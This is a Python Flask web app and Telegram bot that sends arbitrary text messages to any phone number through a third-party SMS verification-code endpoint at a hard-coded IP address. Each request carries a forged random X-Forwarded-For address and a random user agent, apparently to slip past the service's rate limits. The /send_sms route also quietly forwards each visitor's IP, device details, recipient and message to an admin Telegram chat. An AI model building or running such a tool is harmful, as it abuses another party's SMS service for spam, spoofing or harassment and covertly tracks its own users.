from flask import Flask, request, jsonify, render_template
import requests
import os
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import threading
import random
from fake_useragent import UserAgent
from werkzeug.utils import quote as url_quote  # Updated import

app = Flask(__name__)

TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', 'YOUR_TELEGRAM_BOT_TOKEN')
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', 'YOUR_ADMIN_CHAT_ID')

# Function to generate a random IP address
def generate_random_ip():
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))

# Function to get a random user agent
def get_random_user_agent():
    ua = UserAgent()
    return ua.random

# Flask Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/mobile')
def mobile():
    return render_template('mobile.html')

@app.route('/api/send_sms')
def send_sms_api():
    receiver = request.args.get('number')
    text = request.args.get('message')

    headers = {
        'Authorization': 'Bearer',  # Add your token here
        'language': 'en',
        'timeZone': 'Asia/Dhaka',
        'Content-Type': 'application/json; charset=utf-8',
        'Host': '202.51.182.198:8181',
        'Connection': 'Keep-Alive',
        'User-Agent': get_random_user_agent(),
        'X-Forwarded-For': generate_random_ip(),
    }

    json_data = {
        'receiver': receiver,
        'text': text,
        'title': 'Register Account',
    }

    response = requests.post('http://202.51.182.198:8181/nbp/sms/code', headers=headers, json=json_data)
    response_json = response.json()

    if response.status_code == 200:
        if response_json.get("msg_code") == "request.over.max.count":
            return jsonify({'message': 'Failed to send SMS: Over max count'})
        return jsonify({'message': 'SMS sent successfully!'})
    else:
        return jsonify({'message': 'Failed to send SMS', 'status_code': response.status_code, 'error': response_json}), response.status_code

def notify_admin(ip, device_info, receiver, text):
    message = f"IP: {ip}\nDevice Info: {device_info}\nReceiver: {receiver}\nMessage: {text}"
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {
        'chat_id': ADMIN_CHAT_ID,
        'text': message
    }
    requests.post(url, data=data)

@app.route('/send_sms', methods=['POST'])
def send_sms():
    receiver = request.form['receiver']
    text = request.form['text']
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    notify_admin(ip, user_agent, receiver, text)

    headers = {
        'Authorization': 'Bearer',  # Add your token here
        'language': 'en',
        'timeZone': 'Asia/Dhaka',
        'Content-Type': 'application/json; charset=utf-8',
        'Host': '202.51.182.198:8181',
        'Connection': 'Keep-Alive',
        'User-Agent': get_random_user_agent(),
        'X-Forwarded-For': generate_random_ip(),
    }

    json_data = {
        'receiver': receiver,
        'text': text,
        'title': 'Register Account',
    }

    response = requests.post('http://202.51.182.198:8181/nbp/sms/code', headers=headers, json=json_data)
    response_json = response.json()

    if response.status_code == 200:
        if response_json.get("msg_code") == "request.over.max.count":
            return jsonify({'message': 'Failed to send SMS: Over max count'})
        return jsonify({'message': 'SMS sent successfully!'})
    else:
        return jsonify({'message': 'Failed to send SMS', 'status_code': response.status_code, 'error': response_json}), response.status_code

# Telegram Bot Handlers
def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('Welcome! Send /sms <number> <message> to send an SMS.')

def send_sms_telegram(update: Update, context: CallbackContext) -> None:
    try:
        args = context.args
        if len(args) < 2:
            update.message.reply_text('Usage: /sms <number> <message>')
            return

        receiver = args[0]
        text = ' '.join(args[1:])

        headers = {
            'Authorization': 'Bearer',  # Add your token here
            'language': 'en',
            'timeZone': 'Asia/Dhaka',
            'Content-Type': 'application/json; charset=utf-8',
            'Host': '202.51.182.198:8181',
            'Connection': 'Keep-Alive',
            'User-Agent': get_random_user_agent(),
            'X-Forwarded-For': generate_random_ip(),
        }

        json_data = {
            'receiver': receiver,
            'text': text,
            'title': 'Register Account',
        }

        response = requests.post('http://202.51.182.198:8181/nbp/sms/code', headers=headers, json=json_data)
        response_json = response.json()

        if response.status_code == 200:
            if response_json.get("msg_code") == "request.over.max.count":
                update.message.reply_text('Failed to send SMS: Over max count')
            else:
                update.message.reply_text('SMS sent successfully!')
        else:
            update.message.reply_text(f'Failed to send SMS. Status code: {response.status_code}')
    except Exception as e:
        update.message.reply_text(f'Error: {e}')

def main():
    updater = Updater(TELEGRAM_TOKEN)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler('start', start))
    dispatcher.add_handler(CommandHandler('sms', send_sms_telegram))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    threading.Thread(target=main).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
